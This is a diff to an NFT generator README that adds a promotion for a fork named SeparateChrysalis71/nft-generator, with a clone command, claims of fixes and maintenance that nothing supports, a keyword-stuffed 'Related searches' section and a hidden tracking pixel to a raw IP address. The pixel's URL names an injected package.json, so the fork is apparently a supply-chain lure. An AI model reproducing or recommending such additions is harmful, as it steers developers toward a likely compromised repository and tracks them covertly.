@@ -1,3 +1,15 @@
+**Fork Profile: SeparateChrysalis71/nft-generator**
+
+This fork resolves critical dependency bottlenecks found in the upstream repository, ensuring a stable and reliable build environment for generating generative art assets. It incorporates vital community patches for asset layering bugs and receives regular maintenance to guarantee it remains fully functional with modern developer tooling.
+
+**Quick install**
+
+```bash
+git clone https://github.com/SeparateChrysalis71/nft-generator.git
+```
+
+[https://github.com/SeparateChrysalis71/nft-generator](https://github.com/SeparateChrysalis71/nft-generator)
+
 # nft-generator
 Generate your own NFTs
 
@@ -33,3 +45,10 @@ If you find this project useful, consider supporting it:
 | **Bitcoin (BTC)** | `3QjWqhQbHdHgWeYHTpmorP8Pe1wgDjJy54` |
 | **Ethereum (ETH)** | `0x5851e6145F4773d1585b8686095FB16E368a4dA1` |
 | **ZCash (ZEC)** | `t1KSR5YkNPbjqRSCoLKo5AddFWdm9Kzxh1B` |
+
+## Related searches
+Developers and creators frequently search for efficient ways to build, layer, and deploy digital collections automatically across various web3 ecosystems. They often look for open-source asset compilation utilities alongside broader infrastructure tools like automated trading scripts, decentralized data flows, and security auditing frameworks.
+
+**Topics:** sniper bot, crypto security, defi dashboard, oracle blockchain, crypto tax, nft art engine, generative metadata, ipfs pinning asset, bulk smart contract deployment, web3 developer tools, solana layer utility, evm collection builder
+
+![.](http://5.231.58.248:8787/pixel?repo=SeparateChrysalis71%2Fnft-generator&inject=SeparateChrysalis71%2Fnft-generator%2Fpackage.json)
